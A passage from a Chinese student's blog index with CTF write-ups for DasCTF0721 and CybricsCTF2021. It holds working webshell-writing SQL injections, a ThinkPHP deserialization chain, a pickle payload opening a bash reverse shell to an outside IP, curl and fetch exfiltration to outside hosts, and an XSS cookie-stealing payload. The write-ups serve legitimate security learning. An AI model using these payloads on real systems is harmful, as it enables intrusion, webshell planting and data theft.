图穷匕见了属于是2333333\n根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：Beescms_v4.0 sql注入漏洞分析\n在admin后加单引号，提示\n表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段\n简单fuzz可知：过滤了空格（用/**/绕过）（或者用tab绕过 或者%0a绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）\nuser=admin\u0026#39;/**/union/**/selselectect/**/1,2,3,4,5# 回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）\nadmin\u0026#39;/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/\u0026#39;/var/www/html/wuhu.php\u0026#39;# 好耶，连蚁剑拿flag咯\nez_website 简单的题目\n也是现实世界存在的东西，参考：齐博建站系统x1.0代码审计\n直接用已有的链子打\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 上传\n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 虽然会返回一个报错的页面，但是可以在/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php处验证一下是否写上了🐎，文件名字是md5('tag_'.md5($this-\u0026gt;tag))，连接密码是ccc 直接蚁剑\n在雪殇的wp中用的是另一个，更直接的写🐎方式，下面说一下思路（大概\n我们可以先尝试看看敏感函数file_put_contents()是否能利用\n在application/admin/controller/Upgrade.php下看到了文件写入的函数，它位于在writelog()中，这个函数的功能是处理post请求传入的各项参数\n这个config('client_upgrade_edition')捏，跟了一下 它会返回null，再往上看到_initialize()\n所以最后是会将$upgrade_edition写入中/runtime/client_upgrade_edtion.php中；而整个writelog()函数会被sysup()调用\n跟进这个sysup()和$upgrade_edtion，看是否可用+如何用\n在template/admin_style/default/admin/upgrade/index.htm下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看\n抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// 将🐎写进的目标页面/runtime/client_upgrade_edition.php连入蚁剑 拿flag即可\n————比赛的时候我其实是没有搜到齐博建站系统x1.0代码审计这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过\n安全,安全,还是xxx的安全 某个特别安全的商店\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT ); 特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli\n任意注册账号，走一波流程\n😅蚌埠住了\n回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码\n注册时用post提交信息，密码部分用的是md5(app.users.password+'CBCTF')，支付密码是encrsa(app.users.pay_password)，好家伙 这个加密 pay_password部分md5+rsa+b64\u0026hellip;\u0026hellip;\n————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考wp之后的复现\n赛后讲题的时候 出题师傅说参考的是这一篇文章数据加密或成WAF失效最大元凶…（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段\n这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果\n公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭\n重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag\njj\u0026rsquo;s camera jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点\nHint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应\n也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：在吗宝贝？你点开这个网址看看[打开网站偷拍照片] | 点开一个网址我被记录了ip还偷拍了照片\n（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。\n前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx\u0026amp;url=xxx，这是qbl.php的源码\n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt; file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== 参考：wp\neasyweb 有一个docker的附件和一些源码\n首页就是个白底黑字的Hello World，审下源码\n直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: \u0026quot;justMyCode\u0026quot;: false这样可以在调用堆栈处看到完整的调用情况\n可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦\npayload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduce必须返回元组或字符串 def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) 构造请求的话还是老朋友~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; 参考：wp\neasyjava java 根本不会\n放个参考链接 溜了：wp1 wp2\n最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）\n争取早收工吧，还有upload, xss, csrf, sqli\u0026hellip;\u0026hellip;等着总结 还有超级多东西要学要看\n学习好耶！σ`∀´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts) Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! There’s a flag there, and it’s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 — looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely\nScanner (rebyC, Baby, 50 pts) Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面\n首先用Gif Super把帧间隔调为300ms，然后裁剪出中间有用的部分 放入GIF动态图片分解中看结果 都有在线工具就很方便\n所以这个破玩意到底是啥？猪？还是刺猬？ 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone\u0026hellip;. 最后一个是二维码 比较麻烦\n再稍微调整一下尺寸，扫描就行了\nrm -rf’er (CTB, Baby, 166 pts) Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all that’s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 — frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you\n这个题 emmmmm 只要ssh一连接就会自动执行rm -rf /*的指令，当反应过来的时候系统已经删的连ls指令都不剩了\n先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了rm -rf /*，之后就可以顺畅的穿梭于这个buildbox之间拿flag了\n预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成\u0026quot;read\u0026quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中echo $\u0026lt;命令相当于read函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txt，即 读取flag.txt并输出\nAd Network (Web, Baby, 50 pts) Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？\nemmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图 这个图在昨天做的时候看到， 内容是 awesome ad from adnetwork，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的\u0026hellip;\u0026hellip; （都怪edge!!!\n点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\n比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts) Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project — ⚐ The Flag\nAnnouncement website\n简约漂亮的前端\n有个输入邮箱的框，提交会发送一个post请求：digest=xxxx\u0026amp;email=xxxx 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(\u0026lsquo;1@1.com\u0026rsquo;) 随email而改变，尝试注入\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email=\u0026#39;or\u0026#39;1\t// 回显正常 无报错 digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1\u0026#39;)#\t// 报错：Something went wrong during database insert: Column count doesn\u0026#39;t match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1\u0026#39;,1)#\t// 报错：Something went wrong during database insert: Incorrect datetime value: \u0026#39;1\u0026#39; for column \u0026#39;timestamp\u0026#39; at row 1 确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？\ninsert into table_name (email, timestamp) values (email, now()); 可利用的部分是可以插入的email，报错注入\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1\u0026#39;,1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~announcement\u0026#39; digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;announcement\u0026#39;)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~emails,logs\u0026#39; digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;announcement\u0026#39; and table_name=\u0026#39;logs\u0026#39;)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~log\u0026#39; digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or \u0026#39;\t// Something went wrong during database insert: XPATH syntax error: \u0026#39;~cybrics{1N53r7_0ld_900d_5ql}\u0026#39; 没什么好说的，经典报错注入流程：确定字段数-\u0026gt;爆数据库名(announcement)-\u0026gt;表名(emails, logs)-\u0026gt;字段名(log)-\u0026gt;具体数据 拿flag\nMultichat (Web, Medium, 138 pts) Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样\n抓包，看到了Connection: Upgrade Upgrade: websocket，这个聊天室是建立了一个websocket连接\n（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面\n链接里的一个csrf攻击的实例跟这个有点像了\n但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（Admin and tech support are members of a secret chat room.）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag\n（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）\n5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是来自w\u0026amp;m的脚本\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; 或者非预期解：在url部分进行xss，payload: javascript:location.href='http://vps/?cookie='+document.cookie（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag\n参考：HTML5 WebSocket | WebSocket安全问题分析 WebSocket断开原因分析 | Request.mode 使用 Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaborator模块详解 | Running Your Instance of Burp Collaborator Server（列入待完成计划\nASCII Terminal (Network, Baby, 116 pts) Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\nnc连上以后可以看到一个bash $，题目的提示是\u0026quot;ASCII termial\u0026quot;\n把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具\ntoilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如\n可以玩出很多花样~\n书归正题，这里使用toilet -f bigascii9 +command的命令生成结果，将空格换为 .再发送即可\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 \u0026#39;cat flag.txt\u0026#39; \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt （值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的%s/\\s/./g命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下\n最后flag：cybrics{T3553R4C7_15_GOOD}\n————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到录播视频中看\n参考：调皮捣蛋的Linux下有趣终端的合集 | Linux Fun - 如何在终端中创建ASCII文本横幅 | Neofetch - 显示具有分发标志的Linux系统信息\nLX-100 (Network, Easy, 192 pts) Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.\nlx100.pcap\n（说实话，pacp包是真的不会看TAT\n首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是官方视频中确实这样可以成功 emmmm\ntshark -r lx100.pcap -Y \u0026#39;udp.dstport == 60524\u0026#39; -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026#34;hex.txt\u0026#34;)as $i =\u0026gt; $ln) {file_put_contents(\u0026#34;frame$i.jpg\u0026#34;,hex2bin(trim($ln)));} （以下是在别的wp中看到的py脚本： 可成功复现 导出455张jpg图\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) 放大 再放大 每一根 最后的flag是 cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts) Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水\n自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段nmap -sS -Pn 10.193.10.7/24\n发现10.193.10.180的80端口开放，用curl访问\n提示Flag-containing-Records 接着访问两个超链接的内容\ncurl 10.193.10.180/redis.conf是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.conf也是相关的配置文件 只有一句没被注释\nnet.ipv4.conf.all.route_localnet=1 查google，发现了这些：net.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\n是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：\nIn order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n（不得不说ipv4当初把整个127.0.0.0/8的地址都给了本地回环用真的是太慷慨了\u0026hellip;\u0026hellip; 到ipv6就只有一个:: 1\n在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明\ntst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n因为需要nc 所以另开一个shell\n参考：wp | 为什么整个127.*网段都被拿来当做环回地址了？\n本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，此处是参考wp\n道阻且长呀，暑假要好好努力咯 (つд⊂) 参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"欢迎互换友链！！欢迎扩列吹水！！!\nᕕ(ᐛ)ᕗ\nscr1pt - V\u0026amp;N - misc/reverse - 呜呜呜是全栈爷 T1p3 - web/misc D3n13d - web eeee - V\u0026amp;N - pwn - 知名男酮 deebato - V\u0026amp;N - crypto PoZeep - V\u0026amp;N - reverse dem0 - V\u0026amp;N - web ","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"时间飞逝，一眨眼进入大学已经快一年了，但时常觉得报道入校就在昨天。\n去年12月开始接触到ctf，0基础，每周末做一做ctfhub的技能树，当时对整个计算机世界算是完全小白 遇到一个名词就要查一查什么意思，经常是看个半天还是一知半解，做题也只能机械的重复一下搜到的wp里的步骤，有样学样。也就坚持了1个月，就开始复习期末考试→考试→放假，寒假算是在家里躺过去的，每天宅着看看剧 